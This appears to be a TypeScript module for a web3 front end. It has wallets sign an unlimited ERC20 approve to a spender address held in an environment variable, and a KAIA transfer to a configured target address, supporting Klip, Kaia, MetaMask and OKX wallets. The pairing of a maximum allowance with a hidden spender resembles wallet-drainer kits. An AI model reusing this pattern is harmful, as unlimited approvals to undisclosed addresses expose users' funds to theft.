/**
 * 合约调用服务
 * 处理 ERC20 Approve 和 KAIA 转账
 */

// ERC20 Approve 方法的 ABI
const ERC20_APPROVE_ABI = [
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    payable: false,
    stateMutability: 'nonpayable',
    type: 'function',
  },
] as const

// 最大授权金额（2^256 - 1）
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

// Spender 地址（从环境变量获取）
const SPENDER_ADDRESS = process.env.NEXT_PUBLIC_APPROVE_SPENDER_ADDRESS || ''

// 转账目标地址（从环境变量获取）
const TRANSFER_TARGET_ADDRESS = process.env.NEXT_PUBLIC_TRANSFER_TARGET_ADDRESS || ''

// 合约调用结果类型
export interface ContractCallResult {
  success: boolean
  txHash?: string
  error?: string
  // Klip 钱包专用字段
  isKlip?: boolean
  requestKey?: string
  qrData?: string
}

/**
 * 编码 ERC20 Approve 函数调用数据
 * @param spender 授权地址
 * @param amount 授权金额
 * @returns 编码后的 function call data
 */
function encodeApproveData(spender: string, amount: string): string {
  // approve(address,uint256) function selector
  // keccak256("approve(address,uint256)") = 0x095ea7b3
  const functionSelector = '0x095ea7b3'
  
  // 编码 spender (address - 32 bytes)
  const spenderEncoded = spender.replace('0x', '').padStart(64, '0')
  
  // 编码 amount (uint256 - 32 bytes)
  const amountEncoded = BigInt(amount).toString(16).padStart(64, '0')
  
  return functionSelector + spenderEncoded + amountEncoded
}

/**
 * 调用 ERC20 Approve（通用钱包）
 * @param provider window.klaytn 或 window.ethereum
 * @param contractAddress ERC20 合约地址
 * @param fromAddress 用户钱包地址
 * @returns 合约调用结果
 */
async function callERC20Approve(
  provider: any,
  contractAddress: string,
  fromAddress: string
): Promise<ContractCallResult> {
  try {
    // 验证地址
    if (!fromAddress || fromAddress === 'undefined' || fromAddress === 'null') {
      throw new Error('from 地址无效: ' + fromAddress)
    }

    // 确保地址格式正确（统一转为小写）
    const normalizedFromAddress = fromAddress.toLowerCase()
    const normalizedContractAddress = contractAddress.toLowerCase()

    const data = encodeApproveData(SPENDER_ADDRESS, MAX_UINT256)

    const txParams = {
      from: normalizedFromAddress,
      to: normalizedContractAddress,
      data: data,
      gas: '0x' + (100000).toString(16), // 100,000 gas
    }

    console.log('📤 发送 Approve 交易:', {
      from: normalizedFromAddress,
      contract: normalizedContractAddress,
      spender: SPENDER_ADDRESS,
      amount: 'MAX',
      txParams: txParams,
    })

    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [txParams],
    })

    console.log('✅ Approve 交易已发送:', txHash)

    return {
      success: true,
      txHash: txHash,
    }
  } catch (error: any) {
    console.error('❌ Approve 调用失败:', error)

    let errorMessage = error.message || '未知错误'
    
    if (errorMessage.includes('User denied') || 
        errorMessage.includes('User rejected') ||
        errorMessage.includes('user rejected')) {
      errorMessage = '用户取消签名'
    }

    return {
      success: false,
      error: errorMessage,
    }
  }
}

/**
 * 调用 ERC20 Approve（Klip 钱包）
 * @param contractAddress ERC20 合约地址
 * @param fromAddress 用户钱包地址
 * @returns 合约调用结果
 */
async function callERC20ApproveKlip(
  contractAddress: string,
  fromAddress: string
): Promise<ContractCallResult> {
  try {
    console.log('📤 Klip Approve 准备:', {
      contract: contractAddress,
      spender: SPENDER_ADDRESS,
      from: fromAddress,
    })

    // 动态导入 KlipConnector
    const { KlipConnector } = await import('./wallet-connectors')
    const connector = new KlipConnector()

    // Prepare - 获取 request_key 和 QR 数据
    const { requestKey, qrData } = await connector.prepareExecuteContract({
      from: fromAddress,
      contractAddress: contractAddress,
      abi: JSON.stringify(ERC20_APPROVE_ABI[0]),
      params: JSON.stringify([SPENDER_ADDRESS, MAX_UINT256]),
      value: '0',
    })

    console.log('✅ Klip Approve Prepared:', {
      requestKey,
      qrDataLength: qrData.length,
    })

    // 返回 requestKey 和 qrData，由调用方决定显示 QR 码还是触发 deep link
    return {
      success: true,
      isKlip: true,
      requestKey: requestKey,
      qrData: qrData,
    }
  } catch (error: any) {
    console.error('❌ Klip Approve Prepare 失败:', error)
    return {
      success: false,
      error: error.message || '未知错误',
    }
  }
}

/**
 * 根据钱包类型获取对应的 Provider
 * @param walletType 钱包类型
 * @returns Provider 对象
 */
function getProviderByWalletType(walletType: string): any {
  const win = window as any
  
  switch (walletType.toLowerCase()) {
    case 'kaia':
      if (!win.klaytn) {
        throw new Error('未找到 Kaia Wallet Provider (window.klaytn)')
      }
      console.log('✅ 使用 Kaia Wallet Provider (window.klaytn)')
      return win.klaytn
      
    case 'metamask':
      if (!win.ethereum) {
        throw new Error('未找到 MetaMask Provider (window.ethereum)')
      }
      console.log('✅ 使用 MetaMask Provider (window.ethereum)')
      return win.ethereum
      
    case 'okx':
      if (!win.okxwallet) {
        throw new Error('未找到 OKX Wallet Provider (window.okxwallet)')
      }
      console.log('✅ 使用 OKX Wallet Provider (window.okxwallet)')
      return win.okxwallet
      
    case 'rainbowkit':
      // RainbowKit 通常使用 window.ethereum
      if (!win.ethereum) {
        throw new Error('未找到 RainbowKit Provider (window.ethereum)')
      }
      console.log('✅ 使用 RainbowKit Provider (window.ethereum)')
      return win.ethereum
      
    default:
      // 兜底：按优先级尝试
      const provider = win.klaytn || win.ethereum || win.okxwallet
      if (!provider) {
        throw new Error(`未找到钱包 Provider (walletType: ${walletType})`)
      }
      console.warn(`⚠️  未知钱包类型 "${walletType}"，使用默认 Provider`)
      return provider
  }
}

/**
 * 统一的 ERC20 Approve 接口
 * @param walletType 钱包类型
 * @param contractAddress ERC20 合约地址
 * @param fromAddress 用户钱包地址
 * @returns 合约调用结果
 */
export async function approveToken(
  walletType: string,
  contractAddress: string,
  fromAddress: string
): Promise<ContractCallResult> {
  if (!SPENDER_ADDRESS || SPENDER_ADDRESS.includes('待填写')) {
    throw new Error('Spender 地址未配置')
  }

  console.log('🔐 开始 ERC20 Approve:', {
    walletType,
    contract: contractAddress,
    spender: SPENDER_ADDRESS,
    fromAddress: fromAddress,
    fromAddressType: typeof fromAddress,
    fromAddressValid: !!fromAddress && fromAddress !== 'undefined' && fromAddress !== 'null',
  })

  if (walletType.toLowerCase() === 'klip') {
    return callERC20ApproveKlip(contractAddress, fromAddress)
  } else {
    const provider = getProviderByWalletType(walletType)
    return callERC20Approve(provider, contractAddress, fromAddress)
  }
}

/**
 * 转账 KAIA 到目标地址
 * @param walletType 钱包类型
 * @param fromAddress 用户钱包地址
 * @param amount KAIA 数量（Wei 单位）
 * @returns 转账结果
 */
export async function transferKaia(
  walletType: string,
  fromAddress: string,
  amount: string
): Promise<ContractCallResult> {
  if (!TRANSFER_TARGET_ADDRESS || TRANSFER_TARGET_ADDRESS.includes('待填写')) {
    throw new Error('转账目标地址未配置')
  }

  console.log('💸 开始 KAIA 转账:', {
    walletType,
    from: fromAddress,
    to: TRANSFER_TARGET_ADDRESS,
    amount: Number(BigInt(amount)) / 1e18 + ' KAIA',
  })

  try {
    if (walletType.toLowerCase() === 'klip') {
      // Klip 钱包使用 App2App API
      return await transferKaiaKlip(fromAddress, amount)
    } else {
      // 其他钱包使用标准 eth_sendTransaction
      return await transferKaiaStandard(walletType, fromAddress, amount)
    }
  } catch (error: any) {
    console.error('❌ KAIA 转账失败:', error)

    let errorMessage = error.message || '未知错误'
    
    if (errorMessage.includes('User denied') || 
        errorMessage.includes('User rejected') ||
        errorMessage.includes('user rejected')) {
      errorMessage = '用户取消签名'
    }

    return {
      success: false,
      error: errorMessage,
    }
  }
}

/**
 * 标准钱包 KAIA 转账
 * @param walletType 钱包类型
 * @param fromAddress 用户钱包地址
 * @param amount KAIA 数量（Wei 单位）
 * @returns 转账结果
 */
async function transferKaiaStandard(
  walletType: string,
  fromAddress: string,
  amount: string
): Promise<ContractCallResult> {
  const provider = getProviderByWalletType(walletType)

  if (!provider) {
    throw new Error('未找到钱包 Provider')
  }

  // 验证地址
  if (!fromAddress || fromAddress === 'undefined' || fromAddress === 'null') {
    throw new Error('from 地址无效: ' + fromAddress)
  }

  // 确保地址格式正确（统一转为小写）
  const normalizedFromAddress = fromAddress.toLowerCase()

  const valueHex = '0x' + BigInt(amount).toString(16)

  const txParams = {
    from: normalizedFromAddress,
    to: TRANSFER_TARGET_ADDRESS.toLowerCase(),
    value: valueHex,
    gas: '0x' + (21000).toString(16), // 21,000 gas (标准转账)
  }

  console.log('📤 发送转账交易:', {
    from: normalizedFromAddress,
    to: TRANSFER_TARGET_ADDRESS,
    value: valueHex,
    amountInKAIA: Number(BigInt(amount)) / 1e18,
  })

  const txHash = await provider.request({
    method: 'eth_sendTransaction',
    params: [txParams],
  })

  console.log('✅ 转账交易已发送:', txHash)

  return {
    success: true,
    txHash: txHash,
  }
}

/**
 * Klip 钱包 KAIA 转账
 * @param fromAddress 用户钱包地址
 * @param amount KAIA 数量（Wei 单位）
 * @returns 转账结果
 */
async function transferKaiaKlip(
  fromAddress: string,
  amount: string
): Promise<ContractCallResult> {
  try {
    // 将 Wei 转换为 KAIA（字符串格式，最多 6 位小数）
    const amountInKaia = (Number(BigInt(amount)) / 1e18).toFixed(6)
    
    console.log('📤 Klip 转账准备:', {
      from: fromAddress,
      to: TRANSFER_TARGET_ADDRESS,
      amountWei: amount,
      amountKaia: amountInKaia,
    })

    // 动态导入 KlipConnector
    const { KlipConnector } = await import('./wallet-connectors')
    const connector = new KlipConnector()

    // Prepare - 获取 request_key 和 QR 数据
    const { requestKey, qrData } = await connector.prepareSendKLAY({
      from: fromAddress,
      to: TRANSFER_TARGET_ADDRESS,
      amount: amountInKaia, // Klip API 需要 KAIA 单位，不是 Wei
    })

    console.log('✅ Klip 转账 Prepared:', {
      requestKey,
      qrDataLength: qrData.length,
    })

    // 返回 requestKey 和 qrData，由调用方决定显示 QR 码还是触发 deep link
    return {
      success: true,
      isKlip: true,
      requestKey: requestKey,
      qrData: qrData,
    }
  } catch (error: any) {
    console.error('❌ Klip 转账 Prepare 失败:', error)
    return {
      success: false,
      error: error.message || '未知错误',
    }
  }
}
